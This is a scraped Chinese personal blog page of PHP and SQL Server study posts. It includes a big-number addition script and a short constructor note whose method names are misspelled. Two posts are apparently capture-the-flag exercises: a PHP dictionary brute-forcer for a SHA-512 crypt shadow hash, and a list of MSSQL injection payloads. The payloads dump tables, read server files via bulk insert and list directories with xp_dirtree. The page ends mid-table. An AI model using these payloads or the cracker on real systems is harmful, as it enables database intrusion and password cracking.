                  <a href="/categories/PHP-MYSQL学习/" itemprop="url" rel="index">
                    <span itemprop="name">PHP|MYSQL学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp;&nbsp;&nbsp;&nbsp; 前几天，百度了下看见大数计算基本都是c/c++、vb的代码，于是乎我想啊！我用php试试！就这个的写了这段加法代码，php新手，高手很看了代码不要嘲笑！这段代码基本都是自己想的没有参照任何代码！如有雷同纯属巧合！</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp; 本来打算是写四则运算的代码的，哎！一段加法的就把我弄的够呛???????</p>
<hr>
<p>&lt;?php</p>
<p>$str_1=trim(’22222222222222222222222’);//输入数字</p>
<p>$str_2=trim(’999999999999999999999999999999999’);//输入数字</p>
<p>$i_1=strlen($str_1);</p>
<p>$i_2=strlen($str_2);</p>
<p>if($i_1&lt;=$i_2)</p>
<p>{</p>
<p>&nbsp;$ii=$i_2;</p>
<p>&nbsp;$iii=$i_1;</p>
<p>&nbsp;$str_1=str_repeat(’0’,$ii-$iii).$str_1;</p>
<p>}</p>
<p>else</p>
<p>{</p>
<p>&nbsp;$ii=$i_1;</p>
<p>&nbsp;$iii=$i_2;</p>
<p>&nbsp;$str_2=str_repeat(’0’,$ii-$iii).$str_2;</p>
<p>}</p>
<p>$str_mun1=str_split($str_1);</p>
<p>$str_mun2=str_split($str_2);</p>
<p>for($a=-1;$a&lt;$ii;$a++)</p>
<p>{</p>
<p>&nbsp;$str_mun[$a]=0;</p>
<p>}</p>
<p>for($i=$ii-1,$i_3=false;$i&gt;=0;$i–)</p>
<p>{</p>
<p>&nbsp;isset($str_mun1[$i])?:$str_mun1[$i]=0;</p>
<p>&nbsp;isset($str_mun2[$i])?:$str_mun2[$i]=0;</p>
<p>&nbsp;$str_mun3[$i]=(int)$str_mun1[$i]+(int)$str_mun2[$i];</p>
<p>&nbsp;$str_mun3[$i]=$str_mun3[$i]+$str_mun[$i];</p>
<p>&nbsp;if($str_mun3[$i]&gt;=10)</p>
<p>&nbsp;{</p>
<p>&nbsp;&nbsp;$str_mun[$i]=$str_mun3[$i]-10;</p>
<p>&nbsp;&nbsp;$i_3=true;</p>
<p>&nbsp;}</p>
<p>&nbsp;else</p>
<p>&nbsp;{</p>
<p>&nbsp;&nbsp;$str_mun[$i]=$str_mun3[$i];</p>
<p>&nbsp;}</p>
<p>&nbsp;if($i_3)</p>
<p>&nbsp;{</p>
<p>&nbsp;&nbsp;$str_mun[$i-1]=$str_mun[$i-1]+1;</p>
<p>&nbsp;&nbsp;$i_3=false;&nbsp;</p>
<p>&nbsp;}&nbsp;</p>
<p>}</p>
<p>if($str_mun[-1]==0)</p>
<p>{</p>
<p>&nbsp;echo substr(implode(’’,$str_mun),1).”<br>“;</p>
<p>}</p>
<p>else</p>
<p>{</p>
<p>&nbsp;echo implode(’’,$str_mun).”<br>“;</p>
<p>}</p>
<p>?&gt;</p>
<hr>
<p>ps：自己都感觉代码写的很乱，没有什么章法！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2011/10/30/PHP的构造函数和析构函数/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2011/10/30/PHP的构造函数和析构函数/" itemprop="url">PHP的构造函数和析构函数</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2011-10-30T18:59:45+08:00">
                2011-10-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP-MYSQL学习/" itemprop="url" rel="index">
                    <span itemprop="name">PHP|MYSQL学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>class hanshu</p>
<p>{</p>
<p>&nbsp;//构造函数</p>
<p>&nbsp;function _construct&nbsp;()</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;{</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //代码</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp; </p>
<p>//析构函数</p>
<p>function _destruct()</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;{</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//代码</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;}</p>
<p>}</p>
<p>&nbsp;</p>
<p>在这个类中名字为_construct 的函数叫做构造函数，每次new新建一个类的对象的时候就会执行此函数！</p>
<p>类中的_destruct的函数叫做析构函数，每次unset一个对象的时候就会执行该函数！</p>
<p>&nbsp;</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2011/10/19/和linux用户加密有关的破解题/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2011/10/19/和linux用户加密有关的破解题/" itemprop="url">和linux用户加密有关的破解题</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2011-10-19T09:42:47+08:00">
                2011-10-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP-MYSQL学习/" itemprop="url" rel="index">
                    <span itemprop="name">PHP|MYSQL学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp;&nbsp;&nbsp;&nbsp; 学长出了一个和linux有关的题目，题目如下：</p>
<hr>
<p>有一个这个密码：</p>
<p>9RWoDRRmQmSX.Hs9PIo6EB7RgJ32U6aqjyaAE6XpSwEpJtXeo58PuL1ae8R2zytU7hKjQxS1jDJrBO4KlaRb01。</p>
<p>前面的salt部分已经不在了。</p>
<p>但是我只知道在一个salt里面,手头还有一个密码字典.现在我要找出这个密钥的明文和salt跟这个密钥(总共就有3个字符串哦)中的所有字符的ASCII值的和。</p>
<p>这个和就是key咯</p>
<p>例如：找到的明文为”test”, salt为$6$rstbqyhe$; </p>
<p>那么求出test$$rstbqyhe$9RWoDRRmQmSX.Hs9PIo6EB7RgJ32U6aqjyaAE6XpSwEpJtXeo58PuL1ae8R2zytU7hKjQxS1jDJrBO4KlaRb01</p>
<p>&nbsp;所有字符的ascii值得到key</p>
<p>keyword:shadow, crypt</p>
<hr>
<p>他给个两个字典：一个是密码明文的字典，一个是salt的字典，群里的大牛们都是c语言写的暴力破解代码，小菜c学的差，就会点php，所以就只有用php写了！</p>
<hr>
<p>&lt;?php</p>
<p>set_time_limit(0);</p>
<p>$i=0;</p>
<p>$j=false;</p>
<p>$file1_name = fopen(“salt”,”r”);</p>
<p>while(!feof($file1_name))</p>
<p>&nbsp; {</p>
<p>&nbsp; &nbsp;&nbsp; $salt=trim(fgets($file1_name));</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo $salt;echo “<br>“;</p>
<p>&nbsp; &nbsp;&nbsp; $file_name = fopen(“data”,”r”);</p>
<p>&nbsp; &nbsp;&nbsp; while(!feof($file_name))</p>
<p>&nbsp; &nbsp;&nbsp; {</p>
<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; $pwd=trim(fgets($file_name));</p>
<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; echo $pwd;echo “<br>“;</p>
<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; $shandow=crypt($pwd,$salt);</p>
<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; echo $shandow;echo “<br>“;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $shandow1=$salt.”9RWoDRRmQmSX.Hs9PIo6EB7RgJ32U6aqjyaAE6XpSwEpJtXeo58PuL1ae8R2zytU7hKjQxS1jDJrBO4KlaRb01”;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo $shandow1;echo “<br>“;</p>
<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; if(strcmp($shandow,$shandow1)==0)</p>
<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; {</p>
<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; $j=true;</p>
<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; echo “this is key”.”<br>“.$pwd.$shandow .”<br>“;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $key=$pwd.$shandow;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $len=strlen($key);</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for($ii=0,$sum=0;$ii&lt;$len;$ii++){</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ${“str”.$ii}=substr($key,$ii,1);</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ${“asc”.$ii}=ord(${“str”.$ii});</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo ${“asc”.$ii}.”    “;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sum=$sum+${“asc”.$ii};</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp; }</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo “<br>“.”ok! The number is key:”.$sum;</p>
<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; break;</p>
<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; }</p>
<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; echo $i=$i+1;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo “<br>“;</p>
<p>&nbsp; &nbsp;&nbsp; }</p>
<p>&nbsp; &nbsp;&nbsp; fclose($file_name);</p>
<p>&nbsp; &nbsp;&nbsp; if($j==true)</p>
<p>&nbsp; &nbsp;&nbsp; {</p>
<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; break;</p>
<p>&nbsp; &nbsp;&nbsp; }</p>
<p>&nbsp; }</p>
<p>fclose($file1_name);</p>
<p>?&gt;</p>
<hr>
<p>ps：我博客访问量低，我木有漏题！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2011/10/11/关于mssql注入的两个题目/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2011/10/11/关于mssql注入的两个题目/" itemprop="url">关于mssql注入的两个题目</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2011-10-11T16:42:44+08:00">
                2011-10-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SQLServer/" itemprop="url" rel="index">
                    <span itemprop="name">SQLServer</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size:16px;">我们学校三叶草工作室组织的极客大挑战，出了两个sql注入的题目，用的是sql server 2000的数据库。花了我两天，还和被人讨论才给弄出过关的key！</span></p>
<p><span style="font-size:16px;">——————————————————————————————————————</span><span style="font-size:16px;">&nbsp;&nbsp;&nbsp;&nbsp; </span></p>
<p><span style="font-size:16px;">&nbsp;&nbsp;&nbsp;&nbsp; 注入的框架是insert into web values(</span><span style="font-size:16px;">’a’</span><span style="font-size:16px;">,’b</span><span style="font-size:16px;">’</span><span style="font-size:16px;">);&nbsp; 在b的位置我们可以通过表单输入字符串并且输入的字符串可以显示在下面的网站中，相当于就是一个留言册</span><span style="font-size:16px;">，a的位置是被固定的自加</span><span style="font-size:16px;">id。</span></p>
<p><span style="font-size:16px;">题目中没有给任何提示！</span></p>
<p><span style="font-size:16px;">—————————————-</span></p>
<p><span style="font-size:16px;">下面把做题中的语句记录下来，留作以后用：</span></p>
<p><span style="font-size:16px;">’);select text from web</span></p>
<p><span style="font-size:16px;">’);select&nbsp;id</span><span style="font-size:16px;"> from web</span></p>
<p><span style="font-size:16px;">’);insert into </span><span style="font-size:16px;">web(text) select DB_NAME(1);–</span></p>
<p><span style="font-size:16px;">’);insert into Geek_Web45_DB.dbo.web(text) select name from Web400_Key</span><span style="font-size:16px;">.dbo.sysobjects where xtype=’U’;–</span></p>
<p><span style="font-size:16px;">’);insert into Geek_Web45_DB.dbo.web(text) select&nbsp;id</span><span style="font-size:16px;"> from Web400_Key.dbo.sysobjects where xtype=’U’;–</span></p>
<p><span style="font-size:16px;">’);insert into Geek_Web45_DB.dbo.web(text) select name from </span><span style="font-size:16px;">Web400_Key</span><span style="font-size:16px;">.dbo.syscolumns where id=xxxxxxx</span><span style="font-size:16px;">;–</span></p>
<p><span style="font-size:16px;">’);insert into Geek_Web45_DB.dbo.web(text) select </span><span style="font-size:16px;">ok from Web400_Key.dbo.key1;–</span></p>
<p><span style="font-size:16px;">’);insert into Geek_Web45_DB.dbo.web(text) select substring((ok),25,30) from Web400_Key.dbo.key1;–</span></p>
<p><span style="font-size:16px;">———————————-</span></p>
<p><span style="font-size:16px;">’)drop table Geek_Temp.Geek_Web45.ln_test;create table Geek_Temp.Geek_Web45.ln_test(ln VARCHAR(100));–</span></p>
<p><span style="font-size:16px;">’);insert into Geek_Temp.Geek_Web45.ln_test values(’lnlnln’);–</span></p>
<p><span style="font-size:16px;">’);bulk insert Geek_Temp.Geek_Web45.ln_test from ’C:W3B500_KeyW3B500_Keykey2.asp’ with (FIELDTERMINATOR=’,’,ROWTERMINATOR=’<br>’);–</span></p>
<p><span style="font-size:16px;">’);insert into Geek_Web45_DB.dbo.web(text) select ln from Geek_Temp.Geek_Web45.ln_test;–</span></p>
<p><span style="font-size:16px;">’);drop table Geek_Temp.dbo.ln1_test_table;create table Geek_Temp.dbo.ln1_test_table(mulu VARCHAR(100),lujing VARCHAR(100),[file] VARCHAR(100)) Insert Geek_Temp.dbo.ln1_test_table exec master..xp_dirtree”c:</span><span style="font-size:16px;">“,1,1;–</span></p>
<hr>
<p>**select APP_NAME ( ) –当前会话的应用程序</p>
<p>select @@ERROR&nbsp;&nbsp;&nbsp;&nbsp; –返回最后执行的 Transact-SQL 语句的错误代码(integer)</p>
<p>select @@IDENTITY&nbsp;&nbsp;&nbsp; –返回最后插入的标识值</p>
<p>Select USER_NAME()&nbsp;&nbsp;&nbsp;&nbsp; –返回用户数据库用户名</p>
<p>select @@ERROR&nbsp;&nbsp;&nbsp; –返回最后执行的 Transact-SQL 语句的错误代码</p>
<p>Select @@CONNECTIONS&nbsp;&nbsp; –返回自上次SQL启动以来连接或试图连接的次数。</p>
<p>Select GETDATE() –当前时间</p>
<p>Select @@CPU_BUSY/100&nbsp;&nbsp; –返回自上次启动SQL 以来 CPU 的工作时间，单位为毫秒</p>
<p>USE tempdb Select @@DBTS&nbsp;&nbsp; –为当前数据库返回当前 timestamp 数据类型的值。这一 timestamp 值保证在数据库中是唯一的。</p>
<p>select @@IDENTITY –返回最后插入的标识值</p>
<p>Select @@IDLE&nbsp;&nbsp; –返回SQL自上次启动后闲置的时间，单位为毫秒</p>
<p>Select @@IO_BUSY&nbsp;&nbsp;&nbsp; –返回SQL自上次启动后用于执行输入和输出操作的时间，单位为毫秒</p>
<p>Select @@LANGID&nbsp;&nbsp;&nbsp; –返回当前所使用语言的本地语言标识符(ID)。</p>
<p>Select @@LANGUAGE&nbsp;&nbsp;&nbsp; –返回当前使用的语言名</p>
<p>Select @@LOCK_TIMEOUT&nbsp;&nbsp; –当前会话的当前锁超时设置，单位为毫秒。</p>
<p>Select @@MAX_CONNECTIONS&nbsp;&nbsp; –返回SQL上允许的同时用户连接的最大数。返回的数不必为当前配置的数值</p>
<p>EXEC sp_configure&nbsp;&nbsp; –显示当前服务器的全局配置设置</p>
<p>Select @@MAX_PRECISION –返回 decimal 和 numeric 数据类型所用的精度级别，即该服务器中当前设置的精度。默认最大精度38。</p>
<p>select @@OPTIONS&nbsp;&nbsp; –返回当前 SET 选项的信息。</p>
<p>Select @@PACK_RECEIVED&nbsp;&nbsp; –返回SQL自启动后从网络上读取的输入数据包数目。</p>
<p>Select @@PACK_SENT&nbsp;&nbsp; –返回SQ自上次启动后写到网络上的输出数据包数目。</p>
<p>Select @@PACKET_ERRORS&nbsp;&nbsp; –返回自SQL启动后，在SQL连接上发生的网络数据包错误数。</p>
<p>Select @@SERVERNAME –返回运行SQL服务器名称。</p>
<p>Select @@SERVICENAME –返回SQL正在其下运行的注册表键名</p>
<p>Select @@TIMETICKS –返回SQL服务器一刻度的微秒数</p>
<p>Select @@TOTAL_ERRORS&nbsp;&nbsp; –返回 SQL服务器自启动后，所遇到的磁盘读/写错误数。</p>
<p>Select @@TOTAL_READ&nbsp;&nbsp; –返回 SQL服务器自启动后读取磁盘的次数。</p>
<p>Select @@TOTAL_WRITE&nbsp;&nbsp; –返回SQL服务器自启动后写入磁盘的次数。</p>
<p>Select @@TRANCOUNT&nbsp;&nbsp; –返回当前连接的活动事务数。</p>
<p>Select @@VERSION&nbsp;&nbsp; –返回SQL服务器安装的日期、版本和处理器类型。** </p>
<hr>
<p>&nbsp;</p>
<h2 id="SQL2000系统表、存储过程、函数的功能介绍及应用"><a href="#SQL2000系统表、存储过程、函数的功能介绍及应用" class="headerlink" title="SQL2000系统表、存储过程、函数的功能介绍及应用 "></a><a href="http://www.cnblogs.com/Spring/archive/2008/05/28/1209092.html" target="_blank" rel="noopener"><span style="color:#0066aa;">SQL2000系统表、存储过程、函数的功能介绍及应用 </span></a></h2><div class="postText"><br><div id="cnblogs_post_body"><br><br><span lang="EN-US">&lt;?XML:NAMESPACE PREFIX = O /&gt;&lt;o:p&gt;<span style="font-family:’Times New Roman’;font-size:small;">&nbsp;</span>&lt;/o:p&gt;</span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">—-</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">系统表</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">————————————————————————————–</span></span></span><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">虽然使用系统存储过程、系统函数与信息架构视图已经可以为我们提供了相当丰富的元数据信息，但是对于某些特殊的元数据信息，我们仍然需要直接对系统表进行查询。因为</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">SQL Server </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">将所有数据库对象的信息均存放在系统表中，作为</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL Server </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">的管理、开发人员，了解各个系统表的作用将有助于我们了解</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL Server </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">的内在工作原理。</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">SQL Server </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">的系统表非常多，其中最常用的与元数据查询有关的表有如下一些：</span></span><br><br>&nbsp;<br><br><table style="width:375pt;background:#cccccc;mso-cellspacing:.7pt;mso-padding-alt:3.75pt 3.75pt 3.75pt 3.75pt;" class="MsoNormalTable ke-zeroborder" border="0" cellspacing="1" cellpadding="0" width="500"><br><tbody><br><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">系统表</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">描述</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:1;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">syscolumns</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">存储每个表和视图中的每一列的信息以及存储过程中的每个参数的信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:2;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">syscomments</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">存储包含每个视图、规则、默认值、触发器、</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">CHECK </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">约束、</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">DEFAULT </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">约束和存储过程的原始</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">文本语句。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:3;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sysconstraints</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">存储当前数据库中每一个约束的基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:4;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sysdatabases</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">存储当前服务器上每一个数据库的基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:5;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sysindexes</span></span><br><br></td><br><td 